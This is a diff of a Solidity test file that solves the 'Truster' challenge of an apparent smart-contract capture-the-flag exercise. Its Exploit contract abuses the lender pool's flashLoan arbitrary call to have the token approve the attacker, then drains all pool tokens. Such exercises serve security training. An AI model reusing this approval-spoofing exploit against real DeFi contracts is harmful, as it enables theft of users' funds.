@@ -51,7 +51,7 @@ contract TrusterChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_truster() public checkSolvedByPlayer {
-         Exploit exploit = new Exploit(address(pool), address(token),address(recovery)); //hi
+        Exploit exploit = new Exploit(address(token), address(pool), address(recovery));
     }
 
     /**
@@ -68,13 +68,14 @@ contract TrusterChallenge is Test {
 }
 
 contract Exploit {
-    uint256 internal constant TOKENS_IN_POOL = 1_000_000e18;
+    uint256 constant TOKENS_IN_POOL = 1_000_000e18;
 
-    constructor(address _pool, address _token, address recoveryAddress) payable {
-        TrusterLenderPool pool = TrusterLenderPool(_pool);
-        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), TOKENS_IN_POOL);
-        pool.flashLoan(0, address(this), _token, data);
+    constructor(address _token, address _pool, address _recovery) {
         DamnValuableToken token = DamnValuableToken(_token);
-        token.transferFrom(_pool, address(recoveryAddress), TOKENS_IN_POOL);
+        TrusterLenderPool pool = TrusterLenderPool(_pool);
+        //Spoofing the approval via flashloan calldata
+        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), TOKENS_IN_POOL); 
+        pool.flashLoan(0, address(this), address(token), data);
+        token.transferFrom(_pool, _recovery, TOKENS_IN_POOL);
     }
 }
